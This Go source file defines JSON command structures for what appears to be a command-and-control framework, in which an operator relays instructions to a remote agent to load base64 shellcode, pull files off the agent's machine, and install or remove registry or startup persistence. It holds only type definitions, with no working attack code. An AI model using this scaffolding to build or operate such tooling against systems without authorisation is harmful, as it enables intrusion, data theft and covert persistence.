package control

import "encoding/json"

// CommandClient represents a command with its arguments as sent by Client
type CommandClient struct {
	Command   string          `json:"command"`
	Arguments json.RawMessage `json:"data,omitempty"`
}

// ShellcodeArgsClient contains the command-specific arguments for Shellcode Loader as sent by Client
type ShellcodeArgsClient struct {
	FilePath   string `json:"file_path"`
	ExportName string `json:"export_name"`
}

// ShellcodeArgsAgent - what we send to the agent
type ShellcodeArgsAgent struct {
	ShellcodeBase64 string `json:"shellcode_base64"`
	ExportName      string `json:"export_name"`
}

// DownloadArgsClient - what the client sends (operator requests a file)
type DownloadArgsClient struct {
	FilePath string `json:"file_path"` // Path on agent's machine
}

// DownloadArgsAgent - what we send to the agent (same in this case)
type DownloadArgsAgent struct {
	FilePath string `json:"file_path"` // Path on agent's machine
}

// PersistArgsClient - what the client sends
type PersistArgsClient struct {
	Method string `json:"method"` // "registry" or "startup"
	Name   string `json:"name"`   // Name for the persistence entry
	Remove bool   `json:"remove"` // true to remove persistence, false to install
}

// PersistArgsAgent - what we send to the agent
type PersistArgsAgent struct {
	Method    string `json:"method"`
	Name      string `json:"name"`
	Remove    bool   `json:"remove"`
	AgentPath string `json:"agent_path"` // Path where agent executable is located
}
